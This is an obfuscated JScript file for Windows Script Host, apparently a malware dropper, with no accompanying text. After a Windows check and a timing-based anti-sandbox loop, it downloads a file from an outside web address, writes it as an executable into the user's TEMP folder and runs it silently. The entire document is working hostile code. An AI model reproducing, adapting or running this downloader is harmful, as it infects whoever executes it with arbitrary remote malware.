var xz = false;
var j = "CreateObject";
var j0 = function O() {return WScript[j]("WScript.Shell");}(), x = 11;
var wf = "MSXML2.XMLHTTP";
var t0 = 2123213;
var n = 0;
function bb(Ze){j0["Run"](Ze, n, n);};
function zS(){return "" + wf;};
function d0(w0, yK){n = n * 1; return w0 - yK;};
function f(){return j;};
/*@cc_on
  @if (@_win32 || @_win64)
    xz = true;
  @end
@*/
if (xz)
{
var Q = "";
function i(){return 22;};
var ti = 0; var nL = 0;
function UY()
{
var mG = new this["Date"]();
var J = mG["getUTCMilliseconds"]();
WScript["Sleep"](i());
var mG = new this["Date"]();
var lM = mG["getUTCMilliseconds"]();
WScript["Sleep"](i());
var mG = new this["Date"]();
var xT = mG["getUTCMilliseconds"]();
var ti = "Mo";
ti = d0(lM, J);
var nL = "p";
nL = d0(xT, lM);
Q = "open";
return d0(ti, nL);
}
var N0 = false;
var z = false;
for (var w = n; w < i() * 1; w++){if (UY() != n){
N0 = true; 
nL = "31" + 11 * ti + nL; 
z = true; 
break;
}}
function d() {return ((N0 == true) && (N0 == z)) ? 1 : n;};
if (N0 && d() && z){
function N() {return j0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "IvcjJl6BtKSzc.exe";};
 N1 = zS();
 IK = WScript[j](N1);
 var TZ = 1;
 while (TZ){
try {
IK[Q]("GET", "http://www.aluguerdiadema.com/p9wsld", false);
IK["send"]();
QR = "Sleep";
for (;;){WScript[QR](i() * 11); if (IK["readystate"] >= 2 * 2) break;};
TZ = n;
} catch(e){};
}
function my(Py) {var t = (1, 2, 3, 4, 5, Py); return t;};
sx = WScript[f()]("ADODB.Stream");
N1 = sx;
N1[Q]();
N1["type"] = my(1);
N1["write"](IK["ResponseBody"]);
sx["position"] = my(n);
N1["Save" + "ToFile"](N(), 2);
sx["c"+"lose"]();
xq = N();
bb(xq);
}
}

